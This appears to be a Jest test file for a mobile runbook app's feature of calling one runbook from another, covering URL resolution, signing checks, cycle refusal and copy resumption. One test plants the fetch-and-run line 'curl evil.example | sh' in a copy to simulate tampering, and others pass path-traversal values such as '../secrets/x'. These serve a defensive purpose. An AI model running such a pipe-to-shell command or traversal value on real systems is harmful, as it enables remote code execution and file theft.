/**
 * Runbook calls in the app (runbooks/calls.ts): the runbook called comes from the web address next
 * to the caller (D) or from a file picked once (A); it runs as a copy with the parameters passed,
 * and its result comes back to the call's cell. Run all goes on in the copy at a call.
 */
import { act, fireEvent, render, screen, waitFor } from '@testing-library/react-native';
import { parse } from '@md-runbook/core';
import { router } from 'expo-router';
import { addHost, resetHosts } from '../hosts/store';
import { paramValues, resetParamValues } from '../runbooks/params';
import { addRunbook, getRunbook, linkKey, resetRunbooks, updateRunbookText } from '../runbooks/store';
import { activeCall, calledAddress, finishCall, resetCalls, startCall } from '../runbooks/calls';
import { buildManifest, formatManifest, withSignature } from '@md-runbook/core/signing';
import { RunbookView } from '../screens/RunbookView';
import { reportHtml } from '../share/report';
import { FakeRun, fakeConnection } from '../testing/fakeConnection';

jest.mock('expo-router', () => ({
  Link: ({ children }: { children: unknown }) => children,
  Stack: { Screen: () => null },
  router: { push: jest.fn(), back: jest.fn() },
}));
jest.mock('../ssh/transport', () => ({ openTransport: jest.fn(), transportReady: async () => undefined }));
jest.mock('../runbooks/files', () => ({
  ...jest.requireActual('../runbooks/files'),
  pickRunbookFile: jest.fn(),
}));
let mockConnection = fakeConnection();
jest.mock('../ssh/connections', () => ({
  connectionFor: jest.fn(async () => mockConnection),
  disconnect: jest.fn(async () => undefined),
  isConnected: jest.fn(() => false),
}));
const script = (runs: FakeRun[]) => (mockConnection = fakeConnection(runs));
const push = router.push as jest.Mock;
const back = router.back as jest.Mock;
const pick = jest.requireMock<{ pickRunbookFile: jest.Mock }>('../runbooks/files').pickRunbookFile;

const CHILD =
  '---\nparams:\n  - STAGE\n---\n# Release\n\n## Change\n\n```bash\necho "change ${param:STAGE}"\n```\n\n## Verify\n\n```bash\necho verify\n```\n';
const PARENT =
  '---\nparams:\n  - STAGE: dev\n---\n# Upgrade\n\n```bash\necho before\n```\n\n```runbook name="Apply" src="releases/1.md" section=Change\nSTAGE=${param:STAGE}\n```\n\n```bash\necho after\n```\n';
const BASE = 'https://raw.githubusercontent.com/acme/ops/main/runbooks/upgrade.md';

beforeEach(() => {
  resetHosts();
  resetRunbooks();
  resetParamValues();
  resetCalls();
  push.mockClear();
  back.mockClear();
  pick.mockReset();
  script([{ stdout: 'ok\n' }]);
});

describe('runbook calls in the app', () => {
  it('stays on the site and repository it came from', () => {
    expect(calledAddress(BASE, 'releases/1.md')).toBe('https://raw.githubusercontent.com/acme/ops/main/runbooks/releases/1.md');
    expect(calledAddress(BASE, '../other.md')).toBe('https://raw.githubusercontent.com/acme/ops/main/other.md');
    expect(calledAddress(BASE, '../../../../evil/x/main/a.md')).toBeUndefined();
    expect(calledAddress(BASE, 'https://example.net/a.md')).toBeUndefined();
    expect(calledAddress('https://example.net/rb/a.md', '../b.md')).toBe('https://example.net/b.md');
  });

  it('opened from a web address: ▷ gets the runbook next to it, runs its section as a copy, and the result comes back', async () => {
    addHost({ name: 'web-1', hostname: 'web1', port: 22, username: 'deploy' });
    const fetched: string[] = [];
    global.fetch = jest.fn(async (url: string) => {
      fetched.push(url);
      return { ok: true, status: 200, text: async () => CHILD, headers: { get: () => null } };
    }) as unknown as typeof fetch;
    const parent = addRunbook('upgrade.md', PARENT, undefined, linkKey(BASE, PARENT));
    await render(<RunbookView id={parent.id} />);
    await act(async () => {
      fireEvent.press(screen.getByTestId('cell-2-run'));
    });
    await waitFor(() => expect(push).toHaveBeenCalled());
    // Downloaded ahead for lint and estimates, and again for the run (the file as it is now).
    expect([...new Set(fetched)]).toEqual(['https://raw.githubusercontent.com/acme/ops/main/runbooks/releases/1.md']);
    const copyId = (push.mock.calls[0]![0] as { params: { id: string } }).params.id;
    const copy = getRunbook(copyId)!;
    expect(copy.fileName).toMatch(/^1\.\d{8}-\d{6}\.md$/);
    expect(paramValues(copyId)).toEqual({ STAGE: 'dev' });
    expect(activeCall(copyId)).toMatchObject({ parentId: parent.id, cellIndex: 2, runbook: 'releases/1.md', sections: ['Change'] });

    // The copy's screen runs the call's section only, then gives the result back and goes back.
    script([{ stdout: 'change dev\n' }]);
    await render(<RunbookView id={copyId} autorun />);
    await waitFor(() => expect(back).toHaveBeenCalled());
    expect(mockConnection.calls.map((c) => c.source)).toEqual(['echo "change ${STAGE}"']);
    const out = parse(getRunbook(parent.id)!.text).cells[2]!.output!;
    expect(out.attrs.exit).toBe('0');
    expect(out.attrs.runbook).toBe('releases/1.md');
    expect(out.attrs.copy).toBe(copy.fileName);
    expect(out.attrs.steps).toBe('1 done');
    expect(out.attrs.sha256).toMatch(/^[0-9a-f]{64}$/);
    // The report shows the copy's steps under the call.
    const html = reportHtml(getRunbook(parent.id)!);
    expect(html).toMatch(/<a href="#step-2-1">2\.1<\/a>/);
    expect(html).toContain(`<code>${copy.fileName}</code>`);
  });

  it('opened from a file: the file is picked once, by its name', async () => {
    addHost({ name: 'web-1', hostname: 'web1', port: 22, username: 'deploy' });
    const parent = addRunbook('upgrade.md', PARENT);
    pick.mockResolvedValueOnce({ kind: 'picked', name: 'other.md', text: CHILD });
    await render(<RunbookView id={parent.id} />);
    await act(async () => {
      fireEvent.press(screen.getByTestId('cell-2-run'));
    });
    await waitFor(() =>
      expect(screen.getByTestId('run-notice').props.children).toBe('You picked other.md; this step runs 1.md. Pick that file.'),
    );
    expect(push).not.toHaveBeenCalled();
    pick.mockResolvedValueOnce({ kind: 'picked', name: '1.md', text: CHILD });
    await act(async () => {
      fireEvent.press(screen.getByTestId('cell-2-run'));
    });
    await waitFor(() => expect(push).toHaveBeenCalledTimes(1));
    // Remembered: the next run of the call doesn't ask again.
    resetRunbooks();
    expect(pick).toHaveBeenCalledTimes(2);
  });

  const sign = (text: string, patterns: Record<string, string>, version = 1): string => {
    const built = buildManifest(text, { name: 'ops/x', version, scopes: [], patterns });
    if ('errors' in built) throw new Error(built.errors.join('; '));
    return withSignature(text, {
      signer: 'ops@example.net',
      signed: '2026-11-11',
      manifest: formatManifest(built.manifest),
      signature: 'U1NIU0lH',
    });
  };
  const serve = (text: string): void => {
    global.fetch = jest.fn(async () => ({
      ok: true,
      status: 200,
      text: async () => text,
      headers: { get: () => null },
    })) as unknown as typeof fetch;
  };

  it('signed: the call as signed, values matching their patterns, and a signed runbook called', async () => {
    const parentText = sign(PARENT, { STAGE: '[a-z]+' });
    const parent = addRunbook('upgrade.md', parentText, undefined, linkKey(BASE, parentText));
    serve(CHILD);
    expect(await startCall(parent, 2, { STAGE: 'Dev!' })).toEqual({
      kind: 'error',
      message: "STAGE doesn't match its signed pattern [a-z]+: the call doesn't run with it.",
    });
    expect(await startCall(parent, 2, { STAGE: 'dev' })).toEqual({
      kind: 'error',
      message: 'releases/1.md is not signed: a signed runbook only calls signed runbooks.',
    });
    serve(sign(CHILD, { STAGE: '[a-z]+' }).replace('echo verify', 'echo changed'));
    expect(await startCall(parent, 2, { STAGE: 'dev' })).toEqual({
      kind: 'error',
      message: "releases/1.md changed since it was signed: it can't run from a signed runbook.",
    });
    serve(sign(CHILD, { STAGE: '[a-z]+' }));
    expect((await startCall(parent, 2, { STAGE: 'dev' })).kind).toBe('started');
    const edited = addRunbook('upgrade.md', parentText.replace('STAGE=${param:STAGE}', 'STAGE=prod'), undefined, linkKey(BASE, parentText));
    expect(await startCall(edited, 2, { STAGE: 'dev' })).toEqual({
      kind: 'error',
      message: 'This call changed since the runbook was signed: sign the runbook again before it runs.',
    });
  });

  it('refuses a cycle; the cluster: another one is refused, none inherits the caller’s', async () => {
    const A = '# A\n\n```runbook src=b.md\n```\n';
    const B = '# B\n\n```runbook src=a.md\n```\n';
    const base = 'https://example.net/rb/a.md';
    serve(B);
    const a = addRunbook('a.md', A, undefined, linkKey(base, A));
    const started = await startCall(a, 1, {});
    expect(started.kind).toBe('started');
    const copyB = getRunbook((started as { copyId: string }).copyId)!;
    serve(A);
    expect(await startCall(copyB, 1, {})).toEqual({
      kind: 'error',
      message: expect.stringMatching(/^a runbook call cycle: https:\/\/example\.net\/rb\/a\.md → /),
    });

    const P = '---\nkube-context: dev\nkube-context-mode: pin\n---\n# P\n\n```runbook src=k.md\n```\n';
    const p = addRunbook('p.md', P, undefined, linkKey(base, P));
    serve('---\nkube-context: prod\n---\n# K\n\n```bash\necho k\n```\n');
    expect(await startCall(p, 1, {})).toEqual({
      kind: 'error',
      message: 'k.md runs against the Kubernetes context prod, this runbook against dev: nothing ran.',
    });
    serve('# K\n\n```bash\necho k\n```\n');
    const r = await startCall(p, 1, {});
    expect(getRunbook((r as { copyId: string }).copyId)!.text).toMatch(/^---\nkube-context: dev\nkube-context-mode: pin\n---\n/);
  });

  it('a failed call continues its copy; Run with a Fresh Copy starts a new one', async () => {
    serve(CHILD);
    const parent = addRunbook('upgrade.md', PARENT, undefined, linkKey(BASE, PARENT));
    const first = (await startCall(parent, 2, { STAGE: 'dev' })) as { copyId: string };
    const copy = getRunbook(first.copyId)!;
    // As finishCall writes a failed result.
    const failed = parent.text.replace(
      'STAGE=${param:STAGE}\n```\n',
      `STAGE=\${param:STAGE}\n\`\`\`\n<!-- md-runbook:output start exit=1 runbook=releases/1.md copy=${copy.fileName} -->\n\`\`\`text\nx\n\`\`\`\n<!-- md-runbook:output end -->\n`,
    );
    const again = addRunbook('upgrade.md', failed, undefined, linkKey(BASE, PARENT));
    expect(await startCall(again, 2, { STAGE: 'dev' })).toEqual({ kind: 'started', copyId: copy.id, resumed: true });
    const fresh = (await startCall(again, 2, { STAGE: 'dev' }, { fresh: true })) as { copyId: string; resumed: boolean };
    expect(fresh.copyId).not.toBe(copy.id);
    expect(fresh.resumed).toBe(false);
  });

  /** The caller with a failed result naming `copyName` as its copy. */
  const failedWith = (text: string, copyName: string): string =>
    text.replace(
      'STAGE=${param:STAGE}\n```\n',
      `STAGE=\${param:STAGE}\n\`\`\`\n<!-- md-runbook:output start exit=1 runbook=releases/1.md copy=${copyName} -->\n\`\`\`text\nx\n\`\`\`\n<!-- md-runbook:output end -->\n`,
    );

  it('continues only a copy that is still the runbook called; else a fresh copy, saying why', async () => {
    serve(CHILD);
    const parent = addRunbook('upgrade.md', PARENT, undefined, linkKey(BASE, PARENT));
    const first = (await startCall(parent, 2, { STAGE: 'dev' })) as { copyId: string };
    const copy = getRunbook(first.copyId)!;
    // Its blocks changed since (anything that can edit it could have).
    updateRunbookText(copy.id, copy.text.replace('echo verify', 'curl evil.example | sh'));
    const again = addRunbook('upgrade.md', failedWith(PARENT, copy.fileName!), undefined, linkKey(BASE, PARENT));
    const r = await startCall(again, 2, { STAGE: 'dev' });
    expect(r).toEqual({
      kind: 'started',
      copyId: expect.not.stringMatching(copy.id),
      resumed: false,
      note: `Not continuing ${copy.fileName}: its blocks are not those of the runbook called. A fresh copy runs.`,
    });
    const copyId = (r as { copyId: string }).copyId;
    expect(getRunbook(copyId)!.text).not.toContain('evil.example');
    // The call's output says it too.
    finishCall(copyId);
    expect(parse(getRunbook(again.id)!.text).cells[2]!.output!.text).toMatch(/^\[md-runbook\] Not continuing /);

    // A runbook named as a copy names nothing else: not a run copy's name, not continued.
    addRunbook('notes.md', CHILD);
    const named = addRunbook('upgrade.md', failedWith(PARENT, 'notes.md'), undefined, linkKey(BASE, PARENT));
    expect(await startCall(named, 2, { STAGE: 'dev' })).toMatchObject({
      resumed: false,
      note: 'Not continuing notes.md: its name is not that of a run copy of 1.md. A fresh copy runs.',
    });
  });

  it('signed: a copy signed as another version of the runbook called is not continued', async () => {
    const parentText = sign(PARENT, { STAGE: '[a-z]+' });
    const parent = addRunbook('upgrade.md', parentText, undefined, linkKey(BASE, parentText));
    serve(sign(CHILD, { STAGE: '[a-z]+' }));
    const first = (await startCall(parent, 2, { STAGE: 'dev' })) as { copyId: string };
    const copy = getRunbook(first.copyId)!;
    const again = addRunbook('upgrade.md', failedWith(parentText, copy.fileName!), undefined, linkKey(BASE, parentText));
    // Signed as the one called: continued.
    expect(await startCall(again, 2, { STAGE: 'dev' })).toEqual({ kind: 'started', copyId: copy.id, resumed: true });
    // The same blocks, released again as version 2: not that copy.
    serve(sign(CHILD, { STAGE: '[a-z]+' }, 2));
    expect(await startCall(again, 2, { STAGE: 'dev' })).toMatchObject({
      resumed: false,
      note: `Not continuing ${copy.fileName}: it is signed as ops/x version 1, the runbook called as ops/x version 2. A fresh copy runs.`,
    });
  });

  it('refuses a src= value that names another path, before anything is fetched', async () => {
    serve(CHILD);
    const text = PARENT.replace('src="releases/1.md"', 'src="releases/${param:TO}.md"');
    const parent = addRunbook('upgrade.md', text, undefined, linkKey(BASE, text));
    for (const to of ['../secrets/x', 'a/b', 'c:x']) {
      const r = await startCall(parent, 2, { STAGE: 'dev', TO: to });
      expect(r).toEqual({
        kind: 'error',
        message: expect.stringMatching(
          /^src="releases\/\$\{param:TO\}\.md" names releases\/.*: a value in src= fills part of one file or folder name/,
        ),
      });
    }
    expect(global.fetch).not.toHaveBeenCalled();
    expect((await startCall(parent, 2, { STAGE: 'dev', TO: '1' })).kind).toBe('started');
  });

  it('lint and the estimate read the runbook a call names once it is downloaded', async () => {
    serve(CHILD.replace('```bash\necho "change', '```bash estimate=40s\necho "change'));
    const text = PARENT.replace('STAGE=${param:STAGE}', 'STAGE=${param:STAGE}\nNOPE=1').replace(
      '```bash\necho after',
      '```runbook src="releases/${param:STAGE}.md"\n```\n\n```bash\necho after',
    );
    const parent = addRunbook('upgrade.md', text, undefined, linkKey(BASE, text));
    await render(<RunbookView id={parent.id} />);
    await waitFor(() => expect(screen.getByTestId('cell-2-estimate')).toHaveTextContent(/est\. 40s$/));
    expect(screen.getByTestId('cell-2-problems')).toHaveTextContent(/releases\/1\.md\) has no parameter NOPE/);
    expect(screen.getByTestId('cell-3-estimate')).toHaveTextContent(/estimate unknown until run$/);
  });

  it('Run all runs the steps before a call, then goes on in the copy', async () => {
    addHost({ name: 'web-1', hostname: 'web1', port: 22, username: 'deploy' });
    global.fetch = jest.fn(async () => ({
      ok: true,
      status: 200,
      text: async () => CHILD,
      headers: { get: () => null },
    })) as unknown as typeof fetch;
    script([
      { stdout: 'before\n', exitCode: 0 },
      { stdout: 'after\n', exitCode: 0 },
    ]);
    const parent = addRunbook('upgrade.md', PARENT, undefined, linkKey(BASE, PARENT));
    await render(<RunbookView id={parent.id} />);
    await act(async () => {
      fireEvent.press(screen.getByTestId('run-primary'));
    });
    await waitFor(() => expect(push).toHaveBeenCalled());
    expect(mockConnection.calls.map((c) => c.source)).toEqual(['echo before']);
  });
});
